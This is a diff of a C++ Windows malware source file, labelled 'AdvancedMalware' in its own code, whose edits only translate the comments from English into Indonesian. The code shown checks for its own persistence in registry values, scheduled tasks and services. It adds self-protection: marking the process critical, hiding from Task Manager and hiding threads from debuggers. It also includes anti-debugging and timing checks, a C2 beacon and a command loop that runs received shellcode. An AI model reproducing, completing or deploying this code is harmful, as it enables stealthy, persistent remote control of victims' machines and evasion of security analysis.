@@ -4312,7 +4336,7 @@ public:
             DWORD index = 0;
             
             while (RegEnumValueW(hKey, index++, valueName, &valueNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
-                // Check if value name matches our random pattern
+                // cek jika nama value cocok dengan pola random kita
                 if (wcslen(valueName) == 8) {
                     found = true;
                     break;
@@ -4323,7 +4347,7 @@ public:
             RegCloseKey(hKey);
         }
         
-        // Check scheduled tasks
+        // cek scheduled tasks
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         if (SUCCEEDED(hr)) {
             ITaskService* pService = NULL;
@@ -4348,7 +4372,7 @@ public:
                                         hr = pRegisteredTask->get_Name(&taskName);
                                         if (SUCCEEDED(hr)) {
                                             wstring name(taskName);
-                                            // Check if task name matches our random pattern
+                                            // cek jika nama task cocok dengan pola random kita
                                             if (name.length() == 12) {
                                                 found = true;
                                                 SysFreeString(taskName);
@@ -4371,14 +4395,14 @@ public:
             CoUninitialize();
         }
         
-        // Check services
+        // cek services
         SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
         if (hSCManager) {
             DWORD bytesNeeded = 0;
             DWORD servicesReturned = 0;
             DWORD resumeHandle = 0;
             
-            // Get buffer size needed
+            // dapatkan ukuran buffer yang dibutuhkan
             EnumServicesStatusExW(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, 
                                  SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, 
                                  &servicesReturned, &resumeHandle, NULL);
@@ -4390,7 +4414,7 @@ public:
                                          &servicesReturned, &resumeHandle, NULL)) {
                     ENUM_SERVICE_STATUS_PROCESSW* services = (ENUM_SERVICE_STATUS_PROCESSW*)buffer;
                     for (DWORD i = 0; i < servicesReturned; i++) {
-                        // Check if service name matches our random pattern
+                        // cek jika nama service cocok dengan pola random kita
                         if (wcslen(services[i].lpServiceName) == 8) {
                             found = true;
                             break;
@@ -4407,7 +4431,7 @@ public:
 };
 
 // =====================================================
-// ADVANCED SELF-PROTECTION AND DEFENSE EVASION
+// perlindungan diri tingkat lanjut dan penghindaran pertahanan
 // =====================================================
 class AdvancedSelfProtection {
 private:
@@ -4420,14 +4444,14 @@ private:
     bool ProtectProcess() {
         lock_guard<mutex> lock(protectionMutex);
         
-        // Get current process ID
+        // dapatkan ID proses saat ini
         DWORD pid = GetCurrentProcessId();
         
-        // Open process with full access
+        // buka proses dengan akses penuh
         HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         if (!hProcess) return false;
         
-        // Set process protection flags
+        // set flag proteksi proses
         typedef NTSTATUS (NTAPI* pNtSetInformationProcess)(
             HANDLE ProcessHandle,
             DWORD ProcessInformationClass,
@@ -4444,7 +4468,7 @@ private:
         }
         
         if (NtSetInformationProcess) {
-            // Set process protection (requires Windows 8.1 or later)
+            // set proteksi proses (membutuhkan Windows 8.1 atau lebih baru)
             DWORD protectionLevel = 0x01; // PS_PROTECTED_SYSTEM
             NTSTATUS status = NtSetInformationProcess(hProcess, 0x35, &protectionLevel, sizeof(protectionLevel));
             if (status == 0) {
@@ -4453,7 +4477,7 @@ private:
             }
         }
         
-        // Alternative method: Set process as critical
+        // metode alternatif: set proses sebagai critical
         typedef BOOL (WINAPI* pRtlSetProcessIsCritical)(
             BOOLEAN NewValue,
             PBOOLEAN OldValue,
@@ -4483,10 +4507,10 @@ private:
     bool HideProcess() {
         lock_guard<mutex> lock(protectionMutex);
         
-        // Get current process ID
+        // dapatkan ID proses saat ini
         DWORD pid = GetCurrentProcessId();
         
-        // Hide process from task manager
+        // sembunyikan proses dari task manager
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, OBFW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").c_str(),
                           0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
@@ -4499,7 +4523,7 @@ private:
             RegCloseKey(hKey);
         }
         
-        // Alternative method: Unhook from process list
+        // metode alternatif: unhook dari daftar proses
         typedef NTSTATUS (NTAPI* pNtSetInformationThread)(
             HANDLE ThreadHandle,
             DWORD ThreadInformationClass,
@@ -4516,7 +4540,7 @@ private:
         }
         
         if (NtSetInformationThread) {
-            // Hide thread from debuggers
+            // sembunyikan thread dari debugger
             HANDLE hThread = GetCurrentThread();
             NTSTATUS status = NtSetInformationThread(hThread, 0x11, NULL, 0);
             if (status == 0) {
@@ -4530,25 +4554,25 @@ private:
     bool ProtectMemory() {
         lock_guard<mutex> lock(protectionMutex);
         
-        // Get current process handle
+        // dapatkan handle proses saat ini
         HANDLE hProcess = GetCurrentProcess();
         
-        // Get memory regions
+        // dapatkan region memori
         MEMORY_BASIC_INFORMATION mbi;
         PVOID address = 0;
         
         while (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
             if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) {
-                // Check if memory region contains our code
+                // cek jika region memori mengandung kode kita
                 HMODULE hModule = GetModuleHandle(NULL);
                 if ((PVOID)hModule >= mbi.BaseAddress && 
                     (PBYTE)hModule < (PBYTE)mbi.BaseAddress + mbi.RegionSize) {
                     
-                    // Change memory protection to read-only
+                    // ubah proteksi memori ke read-only
                     DWORD oldProtect;
                     if (VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READONLY, &oldProtect)) {
-                        // Add memory region to watch list
-                        // In a real implementation, we would store this information
+                        // tambah region memori ke watch list
+                        // di implementasi nyata, kita akan menyimpan informasi ini
                     }
                 }
             }
@@ -4574,19 +4598,19 @@ private:
             }
         }
 
-        // Check for debugger
+        // cek debugger
         if (IsDebuggerPresent()) {
-            // Try to detach debugger
+            // coba detach debugger
             if (CheckRemoteDebuggerPresentFunc) {
                 BOOL debuggerPresent = FALSE;
                 if (CheckRemoteDebuggerPresentFunc(GetCurrentProcess(), &debuggerPresent) && debuggerPresent) {
-                    // Debugger detected, try to exit
+                    // debugger terdeteksi, coba exit
                     ExitProcess(0);
                 }
             }
         }
 
-        // Check for debugging flags
+        // cek flag debugging
         BOOL isRemoteDebuggerPresent = FALSE;
         if (CheckRemoteDebuggerPresentFunc) {
             CheckRemoteDebuggerPresentFunc(GetCurrentProcess(), &isRemoteDebuggerPresent);
@@ -4595,7 +4619,7 @@ private:
             ExitProcess(0);
         }
         
-        // Check for hardware breakpoints
+        // cek hardware breakpoints
         CONTEXT context;
         context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
         if (GetThreadContext(GetCurrentThread(), &context)) {
@@ -4604,7 +4628,7 @@ private:
             }
         }
         
-        // Check for memory breakpoints
+        // cek memory breakpoints
         PVOID address = 0;
         MEMORY_BASIC_INFORMATION mbi;
         while (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
@@ -4616,14 +4640,14 @@ private:
             address = (PVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
         }
         
-        // Check for timing attacks
+        // cek serangan timing
         LARGE_INTEGER frequency;
         QueryPerformanceFrequency(&frequency);
         
         LARGE_INTEGER start, end;
         QueryPerformanceCounter(&start);
         
-        // Perform some work
+        // lakukan beberapa pekerjaan
         volatile int dummy = 0;
         for (int i = 0; i < 10000; i++) {
             dummy += i;
@@ -4633,7 +4657,7 @@ private:
         
         double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / frequency.QuadPart;
         
-        // If execution took too long, we might be in a debugger
+        // jika eksekusi terlalu lama, kita mungkin di debugger
         if (elapsed > 10.0) {
             ExitProcess(0);
         }
@@ -4643,13 +4667,13 @@ private:
     
     void MonitorProtection() {
         while (running) {
-            // Check and maintain protection
+            // cek dan pertahankan proteksi
             ProtectProcess();
             HideProcess();
             ProtectMemory();
             DetectAndBlockAnalysis();
             
-            // Sleep for a random interval
+            // sleep untuk interval random
             uniform_int_distribution<> dist(5000, 15000);
             Sleep(dist(gen));
         }
@@ -4680,7 +4704,7 @@ public:
 };
 
 // =====================================================
-// MAIN MALWARE CLASS
+// kelas malware utama
 // =====================================================
 class AdvancedMalware {
 private:
@@ -4693,19 +4717,19 @@ private:
     AdvancedSelfProtection selfProtection;
     
     void ExecuteCommands(const vector<BYTE>& commands) {
-        // Parse and execute commands from C2 server
+        // parse dan eksekusi perintah dari server C2
         if (commands.empty()) return;
         
-        // First byte is command type
+        // byte pertama adalah tipe perintah
         switch (commands[0]) {
-            case 0x01: // Update command
+            case 0x01: // perintah update
                 {
-                    // Update malware
-                    // In a real scenario, you would download and execute a new version
+                    // update malware
+                    // di skenario nyata, kamu akan download dan eksekusi versi baru
                 }
                 break;
                 
-            case 0x02: // Execute shellcode
+            case 0x02: // eksekusi shellcode
                 {
                     if (commands.size() > 1) {
                         vector<BYTE> shellcode(commands.begin() + 1, commands.end());
@@ -4714,45 +4738,45 @@ private:
                 }
                 break;
                 
-            case 0x03: // Exfiltrate specific data
+            case 0x03: // exfiltrasi data spesifik
                 {
                     if (commands.size() > 1) {
-                        // Parse data type to exfiltrate
-                        // In a real scenario, you would collect and send the requested data
+                        // parse tipe data untuk di-exfiltrasi
+                        // di skenario nyata, kamu akan koleksi dan kirim data yang diminta
                     }
                 }
                 break;
                 
-            case 0x04: // Establish persistence
+            case 0x04: // buat persistensi
                 {
                     persistence.EstablishPersistence();
                 }
                 break;
                 
-            case 0x05: // Self-destruct
+            case 0x05: // self-destruct
                 {
-                    // Remove persistence mechanisms
-                    // In a real scenario, you would clean up all traces
+                    // hapus mekanisme persistensi
+                    // di skenario nyata, kamu akan bersihkan semua jejak
                     ExitProcess(0);
                 }
                 break;
                 
             default:
-                // Unknown command
+                // perintah tidak dikenal
                 break;
         }
     }
     
     void MainLoop() {
         while (true) {
-            // Check for updates
+            // cek update
             c2.CheckForUpdates();
             
-            // Receive and execute commands
+            // terima dan eksekusi perintah
             vector<BYTE> commands = c2.ReceiveCommands();
             ExecuteCommands(commands);
             
-            // Sleep for a random interval
+            // sleep untuk interval random
             random_device rd;
             mt19937 gen(rd());
             uniform_int_distribution<> dist(30000, 60000);
@@ -4769,29 +4793,29 @@ public:
     }
     
     void Run() {
-        // Check if we're in an analysis environment
+        // cek jika kita di environment analisis
         if (antiAnalysis.IsAnalysisEnvironment()) {
-            // Exit if we detect analysis
+            // exit jika mendeteksi analisis
             ExitProcess(0);
         }
         
-        // Evade analysis techniques
+        // hindari teknik analisis
         antiAnalysis.EvadeAnalysis();
         
-        // Establish persistence
+        // buat persistensi
         persistence.EstablishPersistence();
         
-        // Start self-protection
+        // mulai perlindungan diri
         selfProtection.StartProtection();
         
-        // Start data collection
+        // mulai koleksi data
         dataCollector.Start();
         
-        // Send initial beacon to C2 server
-        vector<BYTE> beacon = {0x00}; // Initial beacon command
+        // kirim beacon awal ke server C2
+        vector<BYTE> beacon = {0x00}; // perintah beacon awal
         c2.SendData(beacon);
         
-        // Enter main loop
+        // masuk ke main loop
         MainLoop();
     }
     
@@ -4802,22 +4826,22 @@ public:
 };
 
 // =====================================================
-// ENTRY POINT
+// entry point
 // =====================================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Initialize COM
+    // inisialisasi COM
     CoInitializeEx(NULL, COINIT_MULTITHREADED);
     
-    // Initialize GDI+
+    // inisialisasi GDI+
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     
-    // Create and run the malware
+    // buat dan jalankan malware
     AdvancedMalware malware;
     malware.Run();
     
-    // Cleanup
+    // cleanup
     GdiplusShutdown(gdiplusToken);
     CoUninitialize();
     
